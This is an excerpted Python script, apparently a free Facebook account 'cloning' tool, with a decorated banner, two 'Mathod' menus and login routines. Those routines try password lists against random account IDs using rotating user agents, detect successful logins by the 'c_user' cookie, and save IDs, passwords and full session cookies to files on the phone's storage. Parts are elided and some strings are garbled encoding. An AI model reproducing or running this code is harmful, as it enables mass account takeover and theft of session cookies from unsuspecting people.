...
os.system('git pull')
os.system(f'xdg-open https://www.facebook.com/Aran6248/')
time.sleep(2.00)
try:
    import requests
except ImportError:
...
logo=("""\33[31;1m╦  \33[32;1m ╦\33[31;1m ╦  ╦ \33[32;1m╔═╗
\33[31;1m║  \33[32;1m ║\33[31;1m ╚╗╔╝\33[32;1m ║╣ 
\33[31;1m╩═╝\33[32;1m ╩\33[31;1m  ╚╝\33[32;1m  ╚═╝
\033[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[38;5;46m┃ \x1b[38;5;196m√ADMIN\x1b[38;5;196m   :\x1b[1;96   PGT X ARAN           \033[38;5;46m┃
\033[38;5;46m┃ \x1b[1;96m√FREE    \x1b[38;5;196m: \033[33;1mTOOL                      \033[38;5;46m┃
\033[38;5;46m┃ \033[33;1m√WORKING \x1b[38;5;196m: \x1b[38;5;196m3G 4G                     \033[38;5;46m┃
\033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┫
\033[38;5;46m┃ \033[33;1mGITHUB  \x1b[38;5;196m: \x1b[38;5;208mAran-6248    \033[38;5;46m┃\033[33;1m BD:RANDOM \033[38;5;46m┃
\033[38;5;46m┃ \x1b[1;96mWATHSAPP\x1b[38;5;196m: \033[1;97m+8801714272574 \033[38;5;46m┃\033[1;97m\033[1;45mVersion 0.2\033[1;0m\033[1;97m\033[38;5;46m┃
\033[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━╝\033[1;37m\n""")
def Main():
	os.system('clear')
	print(logo)
	print('[\033[1;32m1\033[1;37m] Mathod m1 [\033[1;32mBest <> Fire\033[1;37m] ')
	print('[\033[1;32m2\033[1;37m] Mathod m2 [\033[1;32mFast\033[1;37m] ')
...
def mathod1():
	...
	print(" [\033[1;32m3\033[1;37m] TOTAL ACCOUNT: \033[1;32m500 - 5000 - 20000\033[1;37m ")
	...
	print(' [\033[1;32m!\033[1;37m] Clone Complete')
	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mÃ¢Å¸Â©\033[1;37m] /sdcard/LIVE 1RANDOMOK.txt')
	print(47*'\033[1;31m\033[1;37m')
	exit()
...
def mathod2():
	...
	doamin = ' Ã°ÂÂÂÃ°ÂÂÆ’ Ã°ÂÂÂÃ°ÂÂÂ®Ã°ÂÂÂ¦Ã°ÂÂâ€ºÃ°ÂÂÅ¾Ã°ÂÂÂ« Ã°ÂÂÅ“Ã°ÂÂÂ¥Ã°ÂÂÂ¨Ã°ÂÂÂ§Ã°ÂÂÅ¾Ã°ÂÂÂ« '
	print(" [\033[1;32m!\033[1;37m] Example Limit : \033[1;32m500 - 5000 - 20000\033[1;37m ")
	...
	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mÃ¢Å¸Â©\033[1;37m] /sdcard/LIVE Ã¢â‚¬ÂOK.txt')
	print(47*'\033[1;31m\033[1;37m')
	exit()
...
def a(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f'\r\33[1;92m [LIVE  OK] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;37m [COOKIES] '+coki)
                open('/sdcard/LIVE  RANDOM OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\33[1;91m[LIVE  CP] {uid} | {ps}")
                open('/sdcard/R LIVE  CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def m2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:        	            
            session = requests.Session()
            sys.stdout.write(f'\r [LIVE  M2] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [LIVE  OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\33[35;1m [COOKIES] '+coki)
                cek_apk(session,coki)                
                open('/sdcard/LIVE  RANDOM OK M2.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
